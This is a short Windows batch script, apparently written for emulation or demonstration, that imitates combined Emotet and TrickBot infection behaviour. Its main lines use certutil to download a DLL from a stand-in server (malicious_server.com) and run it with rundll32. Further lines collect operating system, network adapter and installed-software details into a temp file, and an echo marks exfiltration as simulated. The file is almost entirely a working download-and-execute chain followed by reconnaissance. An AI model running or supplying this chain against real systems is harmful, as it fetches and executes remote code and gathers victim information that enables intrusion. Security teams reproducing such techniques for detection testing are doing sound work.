rem Emotet & TrickBot combined behavior: Download, execute, and gather system info

rem --- Emotet-like initial infection ---
rem Create a temporary directory
mkdir %TEMP%\infection_temp

rem Download a malicious payload (replace with actual URL and filename)
rem Note: In real scenarios, this payload could be the TrickBot loader itself or a component to download TrickBot.
certutil.exe -urlcache -split -f "http://malicious_server.com/trickbot_loader.dll" "%TEMP%\infection_temp\loader.dll"

rem Execute the payload using rundll32.exe
rem This initiates the TrickBot infection process, potentially involving process injection into svchost.exe
rundll32.exe "%TEMP%\infection_temp\loader.dll",DllEntryPoint

rem --- TrickBot-like reconnaissance (assuming loader.dll injected TrickBot into svchost.exe) ---

rem Gather basic system information
wmic OS get Caption, Version, OSArchitecture >> "%TEMP%\infection_temp\system_info.txt"

rem Gather network adapter information
wmic nicconfig where "IPEnabled='TRUE'" get Description, IPAddress >> "%TEMP%\infection_temp\system_info.txt"

rem Gather installed software information
wmic product get Name, Version >> "%TEMP%\infection_temp\system_info.txt"

rem --- Data exfiltration (simulated) ---
rem In a real scenario, this data would be sent to a C2 server
rem For demonstration, we'll just acknowledge the collection.
echo System information collected and ready for exfiltration (simulated).

rem Clean up (optional, as malware might prioritize stealth over cleanup)
rem del "%TEMP%\infection_temp\loader.dll"
rem del "%TEMP%\infection_temp\system_info.txt"
rem rmdir "%TEMP%\infection_temp"
